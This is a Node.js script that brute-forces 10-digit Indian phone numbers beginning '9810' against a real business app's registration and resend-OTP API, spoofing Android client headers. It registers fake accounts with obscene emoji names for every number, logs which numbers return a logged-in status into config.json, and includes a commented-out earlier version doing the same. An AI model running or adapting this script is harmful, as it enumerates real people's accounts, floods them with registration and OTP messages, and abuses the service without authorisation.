import fs from 'fs';
import fetch from 'node-fetch';
import {Headers} from 'node-fetch';
import { exec } from 'child_process';
import request from 'request';
import progress from 'request-progress';
import { XMLHttpRequest as _XMLHttpRequest } from 'xmlhttprequest'; //XMLHttpRequest
const XMLHttpRequest = _XMLHttpRequest;
import terminalImage from 'terminal-image';
import got from 'got';

//fs.writeFile('config.json', JSON.stringify(config), { flag: 'w+' }, err => {});

const data = fs.readFileSync('config.json', {encoding:'utf8', flag:'r'});
var numbers = JSON.parse(data);

async function getNext(str){
    if(str.length==10){
      var result = await register(str);
      if(result.success){
        if(result.data.is_loggedin){
          if(!numbers.includes(str)){
            numbers.push(str);
            fs.writeFile('config.json', JSON.stringify(numbers), { flag: 'w+' }, err => {});    
          }
          console.log('\x1b[32m%s\x1b[0m', str, result.message);
        }else{
          console.log('\x1b[31m%s\x1b[0m', str, result.message);
        }
      }else{
        console.log('\x1b[31m%s\x1b[0m', str, result.message);
      }
    }else if(str.length<10){
      await getNext(str+"9");
      await getNext(str+"8");
      await getNext(str+"7");
      await getNext(str+"6");
      await getNext(str+"5");
      await getNext(str+"4");
      await getNext(str+"3");
      await getNext(str+"2");
      await getNext(str+"1");
      await getNext(str+"0");
    }
}

async function register(number){
    var myHeaders = new Headers();
    myHeaders.append("authorization", "");
    myHeaders.append("accept", "application/json");
    myHeaders.append("Content-Type", "application/json");
    myHeaders.append("Host", "conappapi.badabusiness.com");
    myHeaders.append("Connection", "Keep-Alive");
    myHeaders.append("Accept-Encoding", "gzip");
    myHeaders.append("User-Agent", "okhttp/4.7.2");

    var raw = JSON.stringify({
      "first_name": "🖕🖕🖕",
      "last_name": "🖕🖕🖕",
      "phone_no": number,
      "country_code": "+91",
      "source_app": "ANDROID",
      "source_version": "1.0",
      "device_id": "UID1001",
      "autoread_code": "cdRRuL5Pes2"
    });

    var requestOptions = {
      method: 'POST',
      headers: myHeaders,
      body: raw,
      redirect: 'follow'
    };

    var response = await fetch("https://conappapi.badabusiness.com/api/v1/register", requestOptions);
    return await response.json();
}

async function resend(number){
    var myHeaders = new Headers();
    myHeaders.append("authorization", "");
    myHeaders.append("accept", "application/json");
    myHeaders.append("Content-Type", "application/json");
    myHeaders.append("Host", "conappapi.badabusiness.com");
    myHeaders.append("Connection", "Keep-Alive");
    myHeaders.append("Accept-Encoding", "gzip");
    myHeaders.append("User-Agent", "okhttp/4.7.2");

    var raw = JSON.stringify({
      "phone_no": number,
      "country_code": "+91",
      "source_app": "ANDROID",
      "source_version": "10",
      "autoread_code": "cdRRuL5Pes2"
    });

    var requestOptions = {
      method: 'POST',
      headers: myHeaders,
      body: raw,
      redirect: 'follow'
    };

    var response = await fetch("https://conappapi.badabusiness.com/api/v1/resend-otp", requestOptions);
    return await response.json();
}

await getNext("9810");
// await getNext("8");
// await getNext("7");
// await getNext("6");
console.log("Done...");





// async function getNext(str){
//   if(str.length==10){
//     //await register("7877920096").then(console.log);
//   }else if(str.length<10){
//     getNext(str+"9");
//     getNext(str+"8");
//     getNext(str+"7");
//     getNext(str+"6");
//     getNext(str+"5");
//     getNext(str+"4");
//     getNext(str+"3");
//     getNext(str+"2");
//     getNext(str+"1");
//     getNext(str+"0");
//   }
// }

// function register(number){
// return new Promise((resolve, reject) => {
//   console.log(2);
//   var data = JSON.stringify({
//     "first_name": "🖕🖕🖕",
//     "last_name": "🖕🖕🖕",
//     "phone_no": number,
//     "country_code": "+91",
//     "source_app": "ANDROID",
//     "source_version": "1.0",
//     "device_id": "UID1001",
//     "autoread_code": "cdRRuL5Pes2"
//   });
  
//   var xhr = new XMLHttpRequest();
//   xhr.withCredentials = true;
  
//    xhr.addEventListener("readystatechange", function() {
//     if(this.readyState === 4) {
//       if(JSON.parse(this.responseText).data.is_register){
//         numbers.push(number);
//         fs.writeFile("config.json", JSON.stringify(numbers), { flag: 'w+' }, err => {});
//       }
      
//       console.log(1);
//       resolve(this.responseText);
//       return;
//     }
//   });
  
//   xhr.open("POST", "https://conappapi.badabusiness.com/api/v1/register");
//   xhr.onerror = function () {
//     reject("Failed");
//     return;
//   };
//   xhr.setRequestHeader("authorization", "");
//   xhr.setRequestHeader("accept", "application/json");
//   xhr.setRequestHeader("Content-Type", "application/json");
//   xhr.setRequestHeader("Host", "conappapi.badabusiness.com");
//   xhr.setRequestHeader("Connection", "Keep-Alive");
//   xhr.setRequestHeader("Accept-Encoding", "gzip");
//   xhr.setRequestHeader("User-Agent", "okhttp/4.7.2");
     
//   xhr.send(data);
// });
// }




